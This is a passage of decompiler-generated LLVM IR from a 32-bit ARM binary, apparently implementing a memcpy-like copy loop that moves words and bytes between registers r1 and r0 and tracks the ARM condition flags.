dec_label_pc_16bb4:                               ; preds = %dec_label_pc_16b9c
  %v1_16bb4 = add i32 %v0_16bac, -16
  %v3_16bb4 = add i32 %v0_16bac, 2147483616
  %v4_16bb4 = and i32 %v1_16bb4, %v3_16bb4
  %v5_16bb4 = icmp slt i32 %v4_16bb4, 0
  store i1 %v5_16bb4, i1* %cpsr_v.global-to-local, align 1
  %v6_16bb4 = icmp slt i32 %v1_16bb4, 0
  store i1 %v6_16bb4, i1* %cpsr_n.global-to-local, align 1
  %v7_16bb4 = icmp eq i32 %v1_16bb4, 0
  store i1 %v7_16bb4, i1* %cpsr_z.global-to-local, align 1
  %v2_16bb8 = xor i1 %v6_16bb4, %v5_16bb4
  br i1 %v2_16bb8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_16bb4
  %v3_16bb8 = load i32, i32* @r1, align 4
  %v4_16bb8 = inttoptr i32 %v3_16bb8 to i32*
  %v5_16bb8 = load i32, i32* %v4_16bb8, align 4
  store i32 %v5_16bb8, i32* @r3, align 4
  %v6_16bb8 = add i32 %v3_16bb8, 4
  %v7_16bb8 = inttoptr i32 %v6_16bb8 to i32*
  %v8_16bb8 = load i32, i32* %v7_16bb8, align 4
  store i32 %v8_16bb8, i32* %r4.global-to-local, align 4
  %v9_16bb8 = add i32 %v3_16bb8, 8
  %v10_16bb8 = inttoptr i32 %v9_16bb8 to i32*
  %v11_16bb8 = load i32, i32* %v10_16bb8, align 4
  store i32 %v11_16bb8, i32* @ip, align 4
  %v12_16bb8 = add i32 %v3_16bb8, 12
  %v13_16bb8 = inttoptr i32 %v12_16bb8 to i32*
  %v14_16bb8 = load i32, i32* %v13_16bb8, align 4
  store i32 %v14_16bb8, i32* %lr.global-to-local, align 4
  %v15_16bb8 = add i32 %v3_16bb8, 16
  store i32 %v15_16bb8, i32* @r1, align 4
  %v4_16bbc = inttoptr i32 %v12_16ba8 to i32*
  store i32 %v5_16bb8, i32* %v4_16bbc, align 4
  %v6_16bbc = add i32 %v0_16ba0, 36
  %v7_16bbc = inttoptr i32 %v6_16bbc to i32*
  %v8_16bbc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_16bbc, i32* %v7_16bbc, align 4
  %v9_16bbc = add i32 %v0_16ba0, 40
  %v10_16bbc = inttoptr i32 %v9_16bbc to i32*
  %v11_16bbc = load i32, i32* @ip, align 4
  store i32 %v11_16bbc, i32* %v10_16bbc, align 4
  %v12_16bbc = add i32 %v0_16ba0, 44
  %v13_16bbc = inttoptr i32 %v12_16bbc to i32*
  %v14_16bbc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_16bbc, i32* %v13_16bbc, align 4
  %v15_16bbc = add i32 %v0_16ba0, 48
  store i32 %v15_16bbc, i32* @r0, align 4
  %v3_16bc0 = load i32, i32* %r2.global-to-local, align 4
  %v4_16bc0 = add i32 %v3_16bc0, -16
  store i32 %v4_16bc0, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_16bb4, %bb136
  %v3_16bd0102111 = phi i32 [ %v15_16bbc, %bb136 ], [ %v12_16ba8, %dec_label_pc_16bb4 ]
  %v0_16bc8.pre = phi i32 [ %v4_16bc0, %bb136 ], [ %v1_16bac, %dec_label_pc_16bb4 ]
  %v2_16bc4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16bc4, i32* @r4, align 4
  br label %dec_label_pc_16bc8

dec_label_pc_16bc8:                               ; preds = %dec_label_pc_16b90, %bb137
  %v3_16bd0101 = phi i32 [ %v0_16ba094, %dec_label_pc_16b90 ], [ %v3_16bd0102111, %bb137 ]
  %v0_16bc8 = phi i32 [ %v1_16b90, %dec_label_pc_16b90 ], [ %v0_16bc8.pre, %bb137 ]
  %v1_16bc8 = add i32 %v0_16bc8, 20
  store i32 %v1_16bc8, i32* %r2.global-to-local, align 4
  %v3_16bc8 = sub i32 0, %v0_16bc8
  %v4_16bc8 = and i32 %v1_16bc8, %v3_16bc8
  %v5_16bc8 = icmp slt i32 %v4_16bc8, 0
  store i1 %v5_16bc8, i1* %cpsr_v.global-to-local, align 1
  %v6_16bc8 = icmp slt i32 %v1_16bc8, 0
  store i1 %v6_16bc8, i1* %cpsr_n.global-to-local, align 1
  %v7_16bc8 = icmp eq i32 %v1_16bc8, 0
  store i1 %v7_16bc8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16bcc

dec_label_pc_16bcc:                               ; preds = %.thread115, %dec_label_pc_16bc8
  %v0_16bdc.pre157 = phi i32 [ %v0_16bdc.pre, %.thread115 ], [ %v1_16bc8, %dec_label_pc_16bc8 ]
  %v3_16bd0 = phi i32 [ %v3_16bd099116, %.thread115 ], [ %v3_16bd0101, %dec_label_pc_16bc8 ]
  %v1_16bd4 = phi i1 [ %v1_16bd8, %.thread115 ], [ %v5_16bc8, %dec_label_pc_16bc8 ]
  %v0_16bd4 = phi i1 [ %v0_16bd8, %.thread115 ], [ %v6_16bc8, %dec_label_pc_16bc8 ]
  %v2_16bcc = xor i1 %v1_16bd4, %v0_16bd4
  br i1 %v2_16bcc, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_16bcc
  %v3_16bcc = load i32, i32* @r1, align 4
  %v4_16bcc = inttoptr i32 %v3_16bcc to i32*
  %v5_16bcc = load i32, i32* %v4_16bcc, align 4
  store i32 %v5_16bcc, i32* @r3, align 4
  %v6_16bcc = add i32 %v3_16bcc, 4
  %v7_16bcc = inttoptr i32 %v6_16bcc to i32*
  %v8_16bcc = load i32, i32* %v7_16bcc, align 4
  store i32 %v8_16bcc, i32* @ip, align 4
  %v9_16bcc = add i32 %v3_16bcc, 8
  %v10_16bcc = inttoptr i32 %v9_16bcc to i32*
  %v11_16bcc = load i32, i32* %v10_16bcc, align 4
  store i32 %v11_16bcc, i32* %lr.global-to-local, align 4
  %v12_16bcc = add i32 %v3_16bcc, 12
  store i32 %v12_16bcc, i32* @r1, align 4
  %v4_16bd0 = inttoptr i32 %v3_16bd0 to i32*
  store i32 %v5_16bcc, i32* %v4_16bd0, align 4
  %v6_16bd0 = add i32 %v3_16bd0, 4
  %v7_16bd0 = inttoptr i32 %v6_16bd0 to i32*
  %v8_16bd0 = load i32, i32* @ip, align 4
  store i32 %v8_16bd0, i32* %v7_16bd0, align 4
  %v9_16bd0 = add i32 %v3_16bd0, 8
  %v10_16bd0 = inttoptr i32 %v9_16bd0 to i32*
  %v11_16bd0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16bd0, i32* %v10_16bd0, align 4
  %v12_16bd0 = add i32 %v3_16bd0, 12
  store i32 %v12_16bd0, i32* @r0, align 4
  %v3_16bd4 = load i32, i32* %r2.global-to-local, align 4
  %v4_16bd4 = add i32 %v3_16bd4, -12
  store i32 %v4_16bd4, i32* %r2.global-to-local, align 4
  %v6_16bd4 = sub i32 11, %v3_16bd4
  %v7_16bd4 = and i32 %v6_16bd4, %v3_16bd4
  %v8_16bd4 = icmp slt i32 %v7_16bd4, 0
  store i1 %v8_16bd4, i1* %cpsr_v.global-to-local, align 1
  %v9_16bd4 = icmp slt i32 %v4_16bd4, 0
  store i1 %v9_16bd4, i1* %cpsr_n.global-to-local, align 1
  %v10_16bd4 = icmp eq i32 %v3_16bd4, 12
  store i1 %v10_16bd4, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_16bcc, %bb138
  %v0_16bdc.pre = phi i32 [ %v4_16bd4, %bb138 ], [ %v0_16bdc.pre157, %dec_label_pc_16bcc ]
  %v3_16bd099116 = phi i32 [ %v12_16bd0, %bb138 ], [ %v3_16bd0, %dec_label_pc_16bcc ]
  %v1_16bd8 = phi i1 [ %v8_16bd4, %bb138 ], [ %v1_16bd4, %dec_label_pc_16bcc ]
  %v0_16bd8 = phi i1 [ %v9_16bd4, %bb138 ], [ %v0_16bd4, %dec_label_pc_16bcc ]
  %v2_16bd8 = xor i1 %v1_16bd8, %v0_16bd8
  br i1 %v2_16bd8, label %dec_label_pc_16bdc, label %dec_label_pc_16bcc

dec_label_pc_16bdc:                               ; preds = %.thread115, %dec_label_pc_16b88
  %v4_16bec = phi i32 [ %v0_16ba094, %dec_label_pc_16b88 ], [ %v3_16bd099116, %.thread115 ]
  %v0_16bdc = phi i32 [ %v1_16b88, %dec_label_pc_16b88 ], [ %v0_16bdc.pre, %.thread115 ]
  %v1_16bdc = add i32 %v0_16bdc, 8
  store i32 %v1_16bdc, i32* %r2.global-to-local, align 4
  %v3_16bdc = sub i32 0, %v0_16bdc
  %v4_16bdc = and i32 %v1_16bdc, %v3_16bdc
  %v5_16bdc = icmp slt i32 %v4_16bdc, 0
  store i1 %v5_16bdc, i1* %cpsr_v.global-to-local, align 1
  %v6_16bdc = icmp slt i32 %v1_16bdc, 0
  store i1 %v6_16bdc, i1* %cpsr_n.global-to-local, align 1
  %v7_16bdc = icmp eq i32 %v1_16bdc, 0
  store i1 %v7_16bdc, i1* %cpsr_z.global-to-local, align 1
  %v2_16be0 = xor i1 %v6_16bdc, %v5_16bdc
  br i1 %v2_16be0, label %bb140, label %dec_label_pc_16be4

dec_label_pc_16be4:                               ; preds = %dec_label_pc_16bdc
  %v1_16be4 = add i32 %v0_16bdc, 4
  store i32 %v1_16be4, i32* %r2.global-to-local, align 4
  %v3_16be4 = sub i32 -5, %v0_16bdc
  %v4_16be4 = and i32 %v3_16be4, %v1_16bdc
  %v5_16be4 = icmp slt i32 %v4_16be4, 0
  store i1 %v5_16be4, i1* %cpsr_v.global-to-local, align 1
  %v6_16be4 = icmp slt i32 %v1_16be4, 0
  store i1 %v6_16be4, i1* %cpsr_n.global-to-local, align 1
  %v7_16be4 = icmp eq i32 %v1_16bdc, 4
  store i1 %v7_16be4, i1* %cpsr_z.global-to-local, align 1
  %v2_16be8 = xor i1 %v6_16be4, %v5_16be4
  %v3_16be8 = load i32, i32* @r1, align 4
  %v4_16be8 = inttoptr i32 %v3_16be8 to i32*
  %v5_16be8 = load i32, i32* %v4_16be8, align 4
  store i32 %v5_16be8, i32* @r3, align 4
  %v7_16be8 = add i32 %v3_16be8, 4
  br i1 %v2_16be8, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_16be4
  store i32 %v7_16be8, i32* @r1, align 4
  %v5_16bec = inttoptr i32 %v4_16bec to i32*
  store i32 %v5_16be8, i32* %v5_16bec, align 4
  %v6_16bec = load i32, i32* @r0, align 4
  %v7_16bec = add i32 %v6_16bec, 4
  store i32 %v7_16bec, i32* @r0, align 4
  %v0_16bfc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_16be4
  %v7_16bf0 = inttoptr i32 %v7_16be8 to i32*
  %v8_16bf0 = load i32, i32* %v7_16bf0, align 4
  store i32 %v8_16bf0, i32* @ip, align 4
  %v9_16bf0 = add i32 %v3_16be8, 8
  store i32 %v9_16bf0, i32* @r1, align 4
  %v4_16bf4 = inttoptr i32 %v4_16bec to i32*
  store i32 %v5_16be8, i32* %v4_16bf4, align 4
  %v6_16bf4 = add i32 %v4_16bec, 4
  %v7_16bf4 = inttoptr i32 %v6_16bf4 to i32*
  %v8_16bf4 = load i32, i32* @ip, align 4
  store i32 %v8_16bf4, i32* %v7_16bf4, align 4
  %v9_16bf4 = add i32 %v4_16bec, 8
  store i32 %v9_16bf4, i32* @r0, align 4
  %v3_16bf8 = load i32, i32* %r2.global-to-local, align 4
  %v4_16bf8 = add i32 %v3_16bf8, -4
  store i32 %v4_16bf8, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_16bdc, %bb, %dec_label_pc_16dac, %dec_label_pc_16d40, %dec_label_pc_16cd4, %bb139
  %v0_16bfc = phi i32 [ %v0_16bfc.pre, %.thread122 ], [ %v2_16c4c, %.thread128 ], [ %v1_16bdc, %dec_label_pc_16bdc ], [ %v2_16b70, %bb ], [ %v0_16bfc61, %dec_label_pc_16dac ], [ %v0_16bfc60, %dec_label_pc_16d40 ], [ %v0_16bfc59, %dec_label_pc_16cd4 ], [ %v4_16bf8, %bb139 ]
  %v1_16bfc = add i32 %v0_16bfc, 4
  store i32 %v1_16bfc, i32* %r2.global-to-local, align 4
  %v3_16bfc = sub i32 0, %v0_16bfc
  %v4_16bfc = and i32 %v1_16bfc, %v3_16bfc
  %v5_16bfc = icmp slt i32 %v4_16bfc, 0
  store i1 %v5_16bfc, i1* %cpsr_v.global-to-local, align 1
  %v6_16bfc = icmp slt i32 %v1_16bfc, 0
  store i1 %v6_16bfc, i1* %cpsr_n.global-to-local, align 1
  %v7_16bfc = icmp eq i32 %v1_16bfc, 0
  store i1 %v7_16bfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16bfc, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_16c04.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_16c00 = load i8*, i8** %stack_var_-8, align 4
  %v4_16c00 = ptrtoint i8* %v3_16c00 to i32
  store i32 %v4_16c00, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_16c04 = phi i32 [ %v0_16c04.pre, %bb140.bb142_crit_edge ], [ %v8_16b6c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_16bfc, i32 %v0_16c04)
  %v0_16c08 = load i32, i32* %r2.global-to-local, align 4
  %v1_16c08 = add i32 %v0_16c08, -2
  %v3_16c08 = sub i32 1, %v0_16c08
  %v4_16c08 = and i32 %v3_16c08, %v0_16c08
  %v5_16c08 = icmp slt i32 %v4_16c08, 0
  store i1 %v5_16c08, i1* %cpsr_v.global-to-local, align 1
  %v6_16c08 = icmp slt i32 %v1_16c08, 0
  store i1 %v6_16c08, i1* %cpsr_n.global-to-local, align 1
  %v7_16c08 = icmp eq i32 %v0_16c08, 2
  store i1 %v7_16c08, i1* %cpsr_z.global-to-local, align 1
  %v0_16c0c = load i32, i32* @r1, align 4
  %v1_16c0c = inttoptr i32 %v0_16c0c to i8*
  %v2_16c0c = load i8, i8* %v1_16c0c, align 1
  %v5_16c0c = add i32 %v0_16c0c, 1
  store i32 %v5_16c0c, i32* %r1.global-to-local, align 4
  %v2_16c10 = load i32, i32* @r0, align 4
  %v3_16c10 = inttoptr i32 %v2_16c10 to i8*
  store i8 %v2_16c0c, i8* %v3_16c10, align 1
  %v4_16c10 = load i32, i32* @r0, align 4
  %v5_16c10 = add i32 %v4_16c10, 1
  store i32 %v5_16c10, i32* %r0.global-to-local, align 4
  %v0_16c14 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16c14 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16c14 = xor i1 %v0_16c14, %v1_16c14
  br i1 %v2_16c14, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_16c14 = load i32, i32* %r1.global-to-local, align 4
  %v4_16c14 = inttoptr i32 %v3_16c14 to i8*
  %v5_16c14 = load i8, i8* %v4_16c14, align 1
  %v8_16c14 = add i32 %v3_16c14, 1
  store i32 %v8_16c14, i32* %r1.global-to-local, align 4
  %v6_16c18 = inttoptr i32 %v5_16c10 to i8*
  store i8 %v5_16c14, i8* %v6_16c18, align 1
  %v7_16c18 = load i32, i32* %r0.global-to-local, align 4
  %v8_16c18 = add i32 %v7_16c18, 1
  store i32 %v8_16c18, i32* %r0.global-to-local, align 4
  %v1_16c1c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16c1c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_16c20 = phi i32 [ %v8_16c18, %bb143 ], [ %v5_16c10, %bb142 ]
  %v2_16c20 = phi i1 [ %v2_16c1c.pre, %bb143 ], [ %v1_16c14, %bb142 ]
  %v1_16c20 = phi i1 [ %v1_16c1c.pre, %bb143 ], [ %v0_16c14, %bb142 ]
  %v0_16c1c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16c1c = xor i1 %v2_16c20, %v1_16c20
  %v4_16c1c = or i1 %v0_16c1c, %v3_16c1c
  br i1 %v4_16c1c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_16c1c = load i32, i32* %r1.global-to-local, align 4
  %v6_16c1c = inttoptr i32 %v5_16c1c to i8*
  %v7_16c1c = load i8, i8* %v6_16c1c, align 1
  %v10_16c1c = add i32 %v5_16c1c, 1
  store i32 %v10_16c1c, i32* %r1.global-to-local, align 4
  %v8_16c20 = inttoptr i32 %v7_16c20 to i8*
  store i8 %v7_16c1c, i8* %v8_16c20, align 1
  %v9_16c20 = load i32, i32* %r0.global-to-local, align 4
  %v10_16c20 = add i32 %v9_16c20, 1
  store i32 %v10_16c20, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_16c24 = load i8*, i8** %stack_var_-8, align 4
  %v3_16c24 = ptrtoint i8* %v2_16c24 to i32
  store i32 %v3_16c24, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_16b6c)
  %v0_16c2c.pre = load i32, i32* @ip, align 4
  %v0_16c34.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_16c38.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_16c2c

dec_label_pc_16c2c:                               ; preds = %dec_label_pc_16b78, %.thread126
  %v2_16c38 = phi i32 [ %v1_16b60, %dec_label_pc_16b78 ], [ %v2_16c38.pre, %.thread126 ]
  %v0_16c34 = phi i32 [ %v0_16b60, %dec_label_pc_16b78 ], [ %v0_16c34.pre, %.thread126 ]
  %v0_16c2c = phi i32 [ %v1_16b78, %dec_label_pc_16b78 ], [ %v0_16c2c.pre, %.thread126 ]
  %v1_16c2c = sub i32 4, %v0_16c2c
  store i32 %v1_16c2c, i32* @ip, align 4
  %v1_16c30 = add i32 %v1_16c2c, -2
  %v3_16c30 = sub i32 1, %v1_16c2c
  %v4_16c30 = and i32 %v3_16c30, %v1_16c2c
  %v5_16c30 = icmp slt i32 %v4_16c30, 0
  store i1 %v5_16c30, i1* %cpsr_v.global-to-local, align 1
  %v6_16c30 = icmp slt i32 %v1_16c30, 0
  store i1 %v6_16c30, i1* %cpsr_n.global-to-local, align 1
  %v7_16c30 = icmp eq i32 %v1_16c2c, 2
  store i1 %v7_16c30, i1* %cpsr_z.global-to-local, align 1
  %v1_16c34 = inttoptr i32 %v0_16c34 to i8*
  %v2_16c34 = load i8, i8* %v1_16c34, align 1
  %v3_16c34 = zext i8 %v2_16c34 to i32
  store i32 %v3_16c34, i32* @r3, align 4
  %v5_16c34 = add i32 %v0_16c34, 1
  store i32 %v5_16c34, i32* @r1, align 4
  %v3_16c38 = inttoptr i32 %v2_16c38 to i8*
  store i8 %v2_16c34, i8* %v3_16c38, align 1
  %v4_16c38 = load i32, i32* @r0, align 4
  %v5_16c38 = add i32 %v4_16c38, 1
  store i32 %v5_16c38, i32* @r0, align 4
  %v0_16c3c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16c3c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16c3c = xor i1 %v0_16c3c, %v1_16c3c
  br i1 %v2_16c3c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_16c2c
  %v3_16c3c = load i32, i32* @r1, align 4
  %v4_16c3c = inttoptr i32 %v3_16c3c to i8*
  %v5_16c3c = load i8, i8* %v4_16c3c, align 1
  %v6_16c3c = zext i8 %v5_16c3c to i32
  store i32 %v6_16c3c, i32* @r3, align 4
  %v8_16c3c = add i32 %v3_16c3c, 1
  store i32 %v8_16c3c, i32* @r1, align 4
  %v6_16c40 = inttoptr i32 %v5_16c38 to i8*
  store i8 %v5_16c3c, i8* %v6_16c40, align 1
  %v7_16c40 = load i32, i32* @r0, align 4
  %v8_16c40 = add i32 %v7_16c40, 1
  store i32 %v8_16c40, i32* @r0, align 4
  %v1_16c44.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16c44.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_16c2c, %bb145
  %v7_16c48 = phi i32 [ %v8_16c40, %bb145 ], [ %v5_16c38, %dec_label_pc_16c2c ]
  %v2_16c48 = phi i1 [ %v2_16c44.pre, %bb145 ], [ %v1_16c3c, %dec_label_pc_16c2c ]
  %v1_16c48 = phi i1 [ %v1_16c44.pre, %bb145 ], [ %v0_16c3c, %dec_label_pc_16c2c ]
  %v0_16c44 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16c44 = xor i1 %v2_16c48, %v1_16c48
  %v4_16c44 = or i1 %v0_16c44, %v3_16c44
  br i1 %v4_16c44, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_16c44 = load i32, i32* @r1, align 4
  %v6_16c44 = inttoptr i32 %v5_16c44 to i8*
  %v7_16c44 = load i8, i8* %v6_16c44, align 1
  %v8_16c44 = zext i8 %v7_16c44 to i32
  store i32 %v8_16c44, i32* @r3, align 4
  %v10_16c44 = add i32 %v5_16c44, 1
  store i32 %v10_16c44, i32* @r1, align 4
  %v8_16c48 = inttoptr i32 %v7_16c48 to i8*
  store i8 %v7_16c44, i8* %v8_16c48, align 1
  %v9_16c48 = load i32, i32* @r0, align 4
  %v10_16c48 = add i32 %v9_16c48, 1
  store i32 %v10_16c48, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_16d7c77 = phi i32 [ %v10_16c48, %bb146 ], [ %v7_16c48, %.thread127 ]
  %v0_16c4c = load i32, i32* %r2.global-to-local, align 4
  %v1_16c4c = load i32, i32* @ip, align 4
  %v2_16c4c = sub i32 %v0_16c4c, %v1_16c4c
  store i32 %v2_16c4c, i32* %r2.global-to-local, align 4
  %v4_16c4c = xor i32 %v1_16c4c, %v0_16c4c
  %v5_16c4c = xor i32 %v2_16c4c, %v0_16c4c
  %v6_16c4c = and i32 %v5_16c4c, %v4_16c4c
  %v7_16c4c = icmp slt i32 %v6_16c4c, 0
  store i1 %v7_16c4c, i1* %cpsr_v.global-to-local, align 1
  %v8_16c4c = icmp slt i32 %v2_16c4c, 0
  store i1 %v8_16c4c, i1* %cpsr_n.global-to-local, align 1
  %v9_16c4c = icmp eq i32 %v0_16c4c, %v1_16c4c
  store i1 %v9_16c4c, i1* %cpsr_z.global-to-local, align 1
  %v2_16c50 = xor i1 %v8_16c4c, %v7_16c4c
  br i1 %v2_16c50, label %bb140, label %dec_label_pc_16c54

dec_label_pc_16c54:                               ; preds = %.thread128
  %v0_16c54 = load i32, i32* @r1, align 4
  %v1_16c54 = urem i32 %v0_16c54, 4
  store i32 %v1_16c54, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16c54 = icmp eq i32 %v1_16c54, 0
  store i1 %v2_16c54, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_16c54 to i2
  br i1 %v2_16c54, label %dec_label_pc_16b88, label %dec_label_pc_16c5c

dec_label_pc_16c5c:                               ; preds = %dec_label_pc_16b80, %dec_label_pc_16c54
  %v0_16d7c76 = phi i32 [ %v1_16b60, %dec_label_pc_16b80 ], [ %v0_16d7c77, %dec_label_pc_16c54 ]
  %v0_16ce4 = phi i32 [ %v2_16b70, %dec_label_pc_16b80 ], [ %v2_16c4c, %dec_label_pc_16c54 ]
  %v0_16c64.off0 = phi i2 [ %extract.t, %dec_label_pc_16b80 ], [ %extract.t131, %dec_label_pc_16c54 ]
  %v0_16c5c = phi i32 [ %v0_16b60, %dec_label_pc_16b80 ], [ %v0_16c54, %dec_label_pc_16c54 ]
  %v1_16c5c = and i32 %v0_16c5c, -4
  store i32 %v1_16c5c, i32* %r1.global-to-local, align 4
  %v1_16c60 = inttoptr i32 %v1_16c5c to i32*
  %v2_16c60 = load i32, i32* %v1_16c60, align 4
  store i32 %v2_16c60, i32* %lr.global-to-local, align 4
  %v4_16c60 = add i32 %v1_16c5c, 4
  store i32 %v4_16c60, i32* %r1.global-to-local, align 4
  %v1_16cdc = add i32 %v0_16ce4, -12
  %v3_16cdc = sub i32 11, %v0_16ce4
  %v4_16cdc = and i32 %v3_16cdc, %v0_16ce4
  %v5_16cdc = icmp slt i32 %v4_16cdc, 0
  store i1 %v5_16cdc, i1* %cpsr_v.global-to-local, align 1
  %v6_16cdc = icmp slt i32 %v1_16cdc, 0
  store i1 %v6_16cdc, i1* %cpsr_n.global-to-local, align 1
  %v7_16cdc = icmp eq i32 %v0_16ce4, 12
  store i1 %v7_16cdc, i1* %cpsr_z.global-to-local, align 1
  %v2_16ce0 = xor i1 %v6_16cdc, %v5_16cdc
  switch i2 %v0_16c64.off0, label %dec_label_pc_16c70 [
    i2 -1, label %dec_label_pc_16d48
    i2 -2, label %dec_label_pc_16cdc
  ]

dec_label_pc_16c70:                               ; preds = %dec_label_pc_16c5c
  br i1 %v2_16ce0, label %dec_label_pc_16cbc, label %dec_label_pc_16c78

dec_label_pc_16c78:                               ; preds = %dec_label_pc_16c70
  store i32 %v1_16cdc, i32* %r2.global-to-local, align 4
  %v3_16c7c = load i32, i32* @r4, align 4
  store i32 %v3_16c7c, i32* %stack_var_-16, align 4
  %v6_16c7c = load i32, i32* @r5, align 4
  store i32 %v6_16c7c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16c80

dec_label_pc_16c80:                               ; preds = %dec_label_pc_16c80.dec_label_pc_16c80_crit_edge, %dec_label_pc_16c78
  %v0_16ca4 = phi i32 [ %v12_16ca4, %dec_label_pc_16c80.dec_label_pc_16c80_crit_edge ], [ %v0_16d7c76, %dec_label_pc_16c78 ]
  %v0_16c84 = phi i32 [ %v0_16c84.pre, %dec_label_pc_16c80.dec_label_pc_16c80_crit_edge ], [ %v4_16c60, %dec_label_pc_16c78 ]
  %v0_16c80 = phi i32 [ %v0_16c80.pre, %dec_label_pc_16c80.dec_label_pc_16c80_crit_edge ], [ %v2_16c60, %dec_label_pc_16c78 ]
  %v3_16c80 = udiv i32 %v0_16c80, 256
  %v1_16c84 = inttoptr i32 %v0_16c84 to i32*
  %v2_16c84 = load i32, i32* %v1_16c84, align 4
  store i32 %v2_16c84, i32* %r4.global-to-local, align 4
  %v3_16c84 = add i32 %v0_16c84, 4
  %v4_16c84 = inttoptr i32 %v3_16c84 to i32*
  %v5_16c84 = load i32, i32* %v4_16c84, align 4
  store i32 %v5_16c84, i32* %r5.global-to-local, align 4
  %v6_16c84 = add i32 %v0_16c84, 8
  %v7_16c84 = inttoptr i32 %v6_16c84 to i32*
  %v8_16c84 = load i32, i32* %v7_16c84, align 4
  store i32 %v8_16c84, i32* %ip.global-to-local, align 4
  %v9_16c84 = add i32 %v0_16c84, 12
  %v10_16c84 = inttoptr i32 %v9_16c84 to i32*
  %v11_16c84 = load i32, i32* %v10_16c84, align 4
  store i32 %v11_16c84, i32* %lr.global-to-local, align 4
  %v12_16c84 = add i32 %v0_16c84, 16
  store i32 %v12_16c84, i32* %r1.global-to-local, align 4
  %v4_16c88 = mul i32 %v2_16c84, 16777216
  %v5_16c88 = or i32 %v4_16c88, %v3_16c80
  store i32 %v5_16c88, i32* @r3, align 4
  %v3_16c8c = udiv i32 %v2_16c84, 256
  %v4_16c90 = mul i32 %v5_16c84, 16777216
  %v5_16c90 = or i32 %v4_16c90, %v3_16c8c
  store i32 %v5_16c90, i32* %r4.global-to-local, align 4
  %v3_16c94 = udiv i32 %v5_16c84, 256
  %v4_16c98 = mul i32 %v8_16c84, 16777216
  %v5_16c98 = or i32 %v4_16c98, %v3_16c94
  store i32 %v5_16c98, i32* %r5.global-to-local, align 4
  %v3_16c9c = udiv i32 %v8_16c84, 256
  %v4_16ca0 = mul i32 %v11_16c84, 16777216
  %v5_16ca0 = or i32 %v4_16ca0, %v3_16c9c
  store i32 %v5_16ca0, i32* @ip, align 4
  %v1_16ca4 = inttoptr i32 %v0_16ca4 to i32*
  store i32 %v5_16c88, i32* %v1_16ca4, align 4
  %v3_16ca4 = add i32 %v0_16ca4, 4
  %v4_16ca4 = inttoptr i32 %v3_16ca4 to i32*
  %v5_16ca4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16ca4, i32* %v4_16ca4, align 4
  %v6_16ca4 = add i32 %v0_16ca4, 8
  %v7_16ca4 = inttoptr i32 %v6_16ca4 to i32*
  %v8_16ca4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16ca4, i32* %v7_16ca4, align 4
  %v9_16ca4 = add i32 %v0_16ca4, 12
  %v10_16ca4 = inttoptr i32 %v9_16ca4 to i32*
  %v11_16ca4 = load i32, i32* @ip, align 4
  store i32 %v11_16ca4, i32* %v10_16ca4, align 4
  %v12_16ca4 = add i32 %v0_16ca4, 16
  store i32 %v12_16ca4, i32* @r0, align 4
  %v0_16ca8 = load i32, i32* %r2.global-to-local, align 4
  %v1_16ca8 = add i32 %v0_16ca8, -16
  store i32 %v1_16ca8, i32* %r2.global-to-local, align 4
  %v3_16ca8 = sub i32 15, %v0_16ca8
  %v4_16ca8 = and i32 %v3_16ca8, %v0_16ca8
  %v5_16ca8 = icmp slt i32 %v4_16ca8, 0
  %v6_16ca8 = icmp slt i32 %v1_16ca8, 0
  %v2_16cac = xor i1 %v6_16ca8, %v5_16ca8
  br i1 %v2_16cac, label %dec_label_pc_16cb0, label %dec_label_pc_16c80.dec_label_pc_16c80_crit_edge

dec_label_pc_16c80.dec_label_pc_16c80_crit_edge:  ; preds = %dec_label_pc_16c80
  %v0_16c80.pre = load i32, i32* %lr.global-to-local, align 4
